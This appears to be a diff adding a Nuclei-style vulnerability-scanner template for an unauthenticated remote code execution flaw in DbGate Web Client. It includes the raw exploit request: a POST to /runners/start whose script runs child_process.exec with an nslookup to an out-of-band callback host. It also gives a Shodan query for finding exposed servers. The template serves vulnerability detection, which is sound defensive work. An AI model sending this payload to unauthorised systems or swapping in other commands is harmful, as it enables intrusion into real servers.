@@ -1,0 +1,37 @@
+id: dbgate-unauth-rce
+
+info:
+  name: DbGate Web Client - Unauthenticated Remote Command Execution
+  author: h0j3n
+  severity: critical
+  description: |
+    DbGate Web Client Management is suspectible to an unauthenticated remote code execution vulnerability.
+  reference:
+    - https://github.com/dbgate/dbgate
+    - https://dbgate.org/docs/env-variables.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    max-request: 1
+    shodan-query: http.favicon.hash:1198579728
+  tags: http,rce,oast,electron,dbgate,oss
+
+http:
+  - raw:
+      - |
+        POST /runners/start HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"script":"process.mainModule.require('child_process').exec('nslookup {{interactsh-url}}')"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '\"runid\"')
+          - contains(interactsh_protocol, "dns")
+        condition: and
+
+# digest: 4b0a00483046022100d1446091398a6ebe1ce163a3d0446a429e0cd40bc1a4094020585465cd6b8af3022100b7b40a6ee6f632fbf237b12d8a0bae881a67c9443772c0c5dfb11ae9f8da08f0:922c64590222798bb761d5b6d8e72950
